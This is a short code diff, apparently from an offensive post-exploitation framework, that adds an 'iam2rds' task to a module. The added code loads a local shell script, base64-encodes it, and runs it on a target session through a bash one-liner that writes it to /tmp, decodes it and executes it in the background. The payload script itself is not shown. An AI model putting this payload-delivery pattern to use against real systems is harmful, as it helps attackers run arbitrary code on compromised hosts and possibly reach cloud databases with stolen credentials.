@@ -34,6 +34,15 @@ class Module(BaseModule):
                 session.log(result)
             except Exception as e:
                 session.log(f"error: {e}")
+        elif task_name == "iam2rds":
+            session.log(f"reading payload: {script_dir}/../resources/iam2rds.sh")
+            try:
+                payload = base64.b64encode(Path(f'{script_dir}/../resources/iam2rds.sh').read_bytes())
+                session.log("payload loaded and ready")
+                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_iam2rds | base64 -d | /bin/bash &'")
+                session.log(result)
+            except Exception as e:
+                session.log(f"error: {e}")
         else:
             result = session.platform.run("${default_payload}")
             session.log(result)
